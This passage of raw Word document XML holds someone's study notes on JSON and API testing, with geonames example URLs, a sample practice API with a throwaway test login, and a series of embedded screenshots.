      <w:hyperlink r:id="rId204" w:tooltip="Mobile" w:history="1">
        <w:r w:rsidRPr="00547F0F">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="70BDCD"/>
            <w:sz w:val="26"/>
          </w:rPr>
          <w:t>mobile</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>and web apps as it makes app work faster and smoother.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId205" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="41B7D8"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>JSON</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">(or JavaScript Object Notation) is a lightweight, easy and popular way to exchange data. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>jQuery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> is not the only tool for manipulating and interfacing with JSON; it’s just </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>my</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> and many others’ preferred method.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">A lot of the services we use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>everyday</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> have JSON-based APIs: Twitter, Facebook and Flickr all send back data in JSON format.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4987F3F5" wp14:editId="7FA6DDE9">
            <wp:extent cx="5943600" cy="481746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srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5943600" cy="4817464"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Free Web Services:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId207" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://www.geonames.org/export/ws-overview.html</w:t>
        </w:r>
      </w:hyperlink>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267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Testing :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Example :</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId208" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00547F0F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://api.geonames.org/citiesJSON?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;lang=de&amp;username=demo</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>This service is also available in XML output :</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Example :</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId209" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00547F0F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://api.geonames.org/cities?north=44.1&amp;south=-9.9&amp;east=-22.4&amp;west=55.2&amp;username=demo</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:t>Sample API:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:t>http://reqres.in/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId210" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>my.request.1@yopmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00547F0F">
        <w:t xml:space="preserve"> / 123456</w:t>
      </w:r>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267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="0049431E" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="180"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="0057A6"/>
          <w:sz w:val="41"/>
          <w:szCs w:val="41"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0049431E">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="0057A6"/>
          <w:sz w:val="41"/>
          <w:szCs w:val="41"/>
        </w:rPr>
        <w:t>https://books.google.co.in/books?id=GjyEFPkMCwcC&amp;pg=PT159&amp;lpg=PT159&amp;dq=architecture+used+in+software+testing+for+ecommerse+site&amp;source=bl&amp;ots=AhrVFWiZ5i&amp;sig=zCmCjXtfJ5e9YTcFTEK1E1uHDgc&amp;hl=hi&amp;sa=X&amp;ved=0ahUKEwihv5nO1bPZAhWLq48KHdVLBSsQ6AEINTAC#v=onepage&amp;q&amp;f=false</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00D32612" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5297DF2C" wp14:editId="2058868C">
            <wp:extent cx="5943600" cy="5514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5514975"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D32612" w:rsidRDefault="00D32612" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="160584B0" wp14:editId="31BD01C1">
            <wp:extent cx="5943600" cy="68941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6894195"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00071E7D" w:rsidRPr="00071E7D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00071E7D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E29C1E8" wp14:editId="75DC8C83">
            <wp:extent cx="5943600" cy="542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5429250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00071E7D" w:rsidRDefault="00071E7D" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="045673F2" wp14:editId="34756463">
            <wp:extent cx="5943600" cy="5177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5177155"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00071E7D" w:rsidRDefault="00071E7D" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="16F4D621" wp14:editId="029B6E42">
            <wp:extent cx="5943600" cy="5676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5676900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00071E7D" w:rsidRDefault="00071E7D" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25A88627" wp14:editId="04869E16">
            <wp:extent cx="5943600" cy="6227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6227445"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00071E7D" w:rsidRDefault="00071E7D" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65B24251" wp14:editId="5BCD2D56">
            <wp:extent cx="5943600" cy="5925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5925820"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0049431E" w:rsidRDefault="0049431E" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00071E7D" w:rsidRDefault="00071E7D" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13B633CB" wp14:editId="6C6A7ABA">
            <wp:extent cx="5943600" cy="6751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6751955"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00071E7D" w:rsidRPr="00547F0F" w:rsidRDefault="00071E7D" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E845375" wp14:editId="6B7A03CF">
            <wp:extent cx="5943600" cy="65284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6528435"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00251D77" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="429C3C3B" wp14:editId="10D73364">
            <wp:extent cx="5943600" cy="636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6367145"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00251D77" w:rsidRPr="00547F0F" w:rsidRDefault="00251D77" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14339ADD" wp14:editId="6D683477">
            <wp:extent cx="5943600" cy="72936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7293610"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00F97FFE" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="242729"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="343" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">8 Important Segments </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F97FFE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="A90000"/>
          <w:spacing w:val="-15"/>
